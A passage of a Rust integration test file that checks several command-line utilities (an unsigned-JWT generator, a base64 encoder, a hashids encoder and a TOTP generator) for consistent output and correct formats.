        // Should generate: aa, ab, ba, bb
        assert!(stdout.contains("aa"));
        assert!(stdout.contains("bb"));
    }
}

// ============================================================================
// Cross-Tool Integration Tests
// ============================================================================

mod integration_tests {
    use super::*;

    #[test]
    fn test_encoder_jwt_integration() {
        // Create a JWT and decode its parts manually
        let (_, jwt_out, _) = run_cli("jwt-tool", &["unsigned", r#"{"test":"value"}"#]);
        let jwt = jwt_out.lines().find(|l| l.starts_with("eyJ")).unwrap_or("").trim();

        if jwt.is_empty() {
            // JWT may be on different line, just verify the command succeeded
            assert!(jwt_out.contains("eyJ"));
            return;
        }

        // Extract header part and decode with encoder
        let header_b64 = jwt.split('.').next().unwrap();
        // Add padding if needed for base64 decode
        let padded = match header_b64.len() % 4 {
            2 => format!("{}==", header_b64),
            3 => format!("{}=", header_b64),
            _ => header_b64.to_string(),
        };
        let (code, decoded, _) = run_cli("encoder", &["decode", "base64", &padded]);
        assert_eq!(code, 0);
        assert!(decoded.contains("alg") || decoded.contains("typ"));
    }

    #[test]
    fn test_hashids_consistent_encoding() {
        // Encode same values with same salt multiple times
        let salt = "consistent_test";
        let (_, out1, _) = run_cli("hashids-tool", &["encode", "1,2,3", "--salt", salt]);
        let (_, out2, _) = run_cli("hashids-tool", &["encode", "1,2,3", "--salt", salt]);

        let hash1 = out1.trim().split_whitespace().last().unwrap();
        let hash2 = out2.trim().split_whitespace().last().unwrap();
        assert_eq!(hash1, hash2);
    }

    #[test]
    fn test_totp_code_format() {
        // Generate TOTP and verify format
        let (_, out, _) = run_cli("totp-tool", &["generate", "JBSWY3DPEHPK3PXP"]);
        let code_line = out.lines().find(|l| l.contains("TOTP Code:")).unwrap();
        let digits: String = code_line.chars().filter(|c| c.is_ascii_digit()).collect();

        // Should be exactly 6 digits
        assert_eq!(digits.len(), 6);
        // Should be numeric
        assert!(digits.parse::<u32>().is_ok());
    }
}
